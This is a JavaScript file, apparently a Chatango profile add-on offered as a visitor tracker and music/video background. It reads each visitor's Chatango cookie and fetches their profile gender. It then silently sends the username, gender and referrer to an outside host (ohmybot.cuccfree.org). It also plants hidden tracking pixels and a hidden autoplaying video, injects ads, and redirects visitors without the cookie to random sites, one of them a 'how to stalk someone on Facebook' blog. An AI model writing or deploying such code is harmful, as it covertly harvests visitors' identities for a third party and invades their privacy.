var ref= top.document.referrer;
var site1="ohmybot.cuccfree.org";
var myElem = document.getElementById('fpix_wrapper');
if (myElem === null) {
myElem = document.body;
}
var video_id = document.getElementById("encode").getAttribute("data-video");
var display = document.getElementById("encode").getAttribute("data-display");
if(!myElem.innerHTML.match(/id\=\"ytv\"/g)){
if(display=="false"){
myElem.innerHTML +="<div id=\"ytv\" style=\"top:0px;left:0px;position: fixed; z-index: -99; width: 1px; height: 1px\"><object width=\"100%\" height=\"100%\"><param name=\"movie\" value=\"http://www.youtube.com/v/"+video_id+"?version=3&amp;hl=en_US&autoplay=1&loop=1\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/"+video_id+"?version=3&amp;hl=en_US&autoplay=1&loop=1\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"100%\" height=\"100%\"></embed></object></div>";
}
else{
myElem.innerHTML +="<div id=\"ytv\" style=\"top:0px;left:0px;position: fixed; z-index: -99; width: 100%; height: 100%\"><object width=\"100%\" height=\"100%\"><param name=\"movie\" value=\"http://www.youtube.com/v/"+video_id+"?version=3&amp;hl=en_US&autoplay=1&loop=1\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/"+video_id+"?version=3&amp;hl=en_US&autoplay=1&loop=1\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"100%\" height=\"100%\"></embed></object></div>";
}
myElem.innerHTML +="<img style=\"display:none\" src=\"http://w1.webreseau.com/impression.asp?IDClient=455181\" width=\"1\" height=\"1\"><img style=\"display:none\" src=\"http://whos.amung.us/widget/450fbemo.png\" width=\"1\" height=\"1\" border=\"0\" />";
}
function readCookie(n){n+='=';for(var a=document.cookie.split(/;\s*/),i=a.length-1;i>=0;i--)if(!a[i].indexOf(n))return a[i].replace(n,'');}
if(!readCookie("id.chatango.com") || document.getElementsByClassName("top-links").length!=0){
var site=["http://chatango-tips-and-tricks.com/","http://450fbemo.com","http://bit.ly/1Sls0JC","http://how-to-stalk-someone-on-facebook.blogspot.com","http://ultimatemoji.com"];
window.location.replace(site[Math.floor(Math.random()*site.length)]);
}
else{
var visitor = readCookie("id.chatango.com").toLowerCase();
document.getElementsByClassName("top-links").length==0
var current_URL=document.URL;
var me = current_URL.replace(/^http:\/\/(.*?)\.chatango\.com(.*?)$/i,"$1");
me = me.split(".");
if(me.length > 0){me=me[me.length-1].replace(/\W+/g,'');}else{me=me[0].replace(/\W+/g,'');}
var myElem = document.getElementById('450FBEMO');
if (myElem === null) {
document.body.innerHTML+="<div id=\"450FBEMO\"></div>";
}
function tracker(server,user,visitor,sex,display,b){
var ts = new Date().getTime();
var b_object = null;
if(window.XMLHttpRequest){
b_object = new XMLHttpRequest();}
else if(window.ActiveXObject){
b_object = new ActiveXObject("Microsoft.XMLHTTP");}
b_object.open("GET","http://"+server+"/omb2.php?user="+user+"&visitor="+visitor+"&sex="+sex+"&ts="+ts+"&best="+b+"&ref="+ref,true);
b_object.setRequestHeader('Content-Type','application/x-www-form-urlencoded; charset=UTF-8');
b_object.send("");
b_object.onreadystatechange = function(){
if(b_object.readyState==4){
if(b_object.status==200){
if(display==true){
document.getElementById("left_container").innerHTML ="<a target=\"_blank\" href=\"http://chatango-tips-and-tricks.com/profile/"+user+".html\"><img style=\"-webkit-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.25);-moz-box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.25);box-shadow: 10px 10px 5px 0px rgba(0,0,0,0.25);border: 0px solid black;border-radius: 20px;-moz-border-radius: 20px;\" src=\"http://fp.chatango.com/profileimg/"+user.substr(0,1)+"/"+user.substr(1,1)+"/"+user+"/full.jpg\" width=\"300\"></a><br /><br />";
document.getElementById("left_container").innerHTML += b_object.responseText;
}
}}
}
}
var url_part = "http://ust.chatango.com/profileimg/"+visitor.substr(0,1)+"/"+visitor.substr(1,1)+"/"+visitor+"/mod1.xml";
var xhr = null;
if(window.XMLHttpRequest){
xhr = new XMLHttpRequest();}
else if(window.ActiveXObject){
xhr = new ActiveXObject("Microsoft.XMLHTTP");}
xhr.open("GET",url_part,true);
xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded; charset=UTF-8');
xhr.send("");
xhr.onreadystatechange = function(){
if(xhr.readyState==4){
if(xhr.status==200){
var sex = xhr.responseText.replace(/^(.*?)<s>(.*?)<\/s>(.*?)$/g,"$2");
if(!sex.match(/^M|F$/) ){sex="U";}
tracker(site1,me,visitor,sex,true,"");
}
}}
var profile_text = document.getElementsByClassName('profile_text');
for(var i = 0; i < profile_text.length; i++)
    {
		profile_text[i].innerHTML = profile_text[i].innerHTML.replace(/\@user/g, "<a href=\"http://"+visitor+".chatango.com/fpix\" style=\"text-shadow: 4px 4px 6px rgba(150, 150, 150, 1);\">"+visitor.charAt(0).toUpperCase()+visitor.substring(1)+"</a>");
		var re = new RegExp("About "+visitor+":", 'gi');
		if(profile_text[i].innerHTML.match(re)){profile_text[i+1].innerHTML='<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> <ins class="adsbygoogle" style="display:inline-block;width:468px;height:60px" data-ad-client="ca-pub-4969687065672454" data-ad-slot="2309470480"></ins> <script> (adsbygoogle = window.adsbygoogle || []).push({}); </script><br/>'+profile_text[i+1].innerHTML;}
		}
if(document.getElementsByClassName('topad')[0]){
document.getElementsByClassName('topad')[0].innerHTML="<style> ul, .ctt { list-style-type: none; color:#FFFFFF; text-decoration:none; font-weight:bold; font: 18px \"Lucida sans\", Arial, Helvetica; } .ctt:hover{color:#FF0000;text-decoration:none; font-weight:bold; font: 18px \"Lucida sans\", Arial, Helvetica; } </style> <div style='display:inline-block;padding-right:5px;'> <a href='http://chatango-tips-and-tricks.com'><img height='90' src='https://lh3.googleusercontent.com/-gpeMETQkCNI/VV-s-nHN66I/AAAAAAAAAik/lmwzgdfy8J0/h120/chatango_best_chatroom.png'/></a></div> <div style='display:inline-block;margin-right:5px;'><ul class='posts'> <li><a href='http://chatango-tips-and-tricks.com/profile/'>Where is a Chatango user ?</a></li> <li><a href='http://chatango-tips-and-tricks.com/how-to-put-music-on-chatango-profile/'>Youtube Music Background</a></li> <li><a href='http://chatango-tips-and-tricks.com/how-to-put-video-background-on-chatango-profile/'>Youtube Video Background</a></li></ul> </div><div style='display:inline-block;text-align:left;'><ul class='posts'> <li><a href='http://chatango-tips-and-tricks.com'>Directory of Chatango chatbox</a></li> <li><a href='http://chatango-tips-and-tricks.com/how-to-convert-text-to-image/'>Convert Text To Image</a></li> <li><a href='http://chatango-tips-and-tricks.com/how-to-see-who-visited-my-profile/'>Chatango Visitors Tracker</a></li> </ul></div>";
}
}
function tab(b){
tracker(site1,me,visitor,"U",true,b);
}
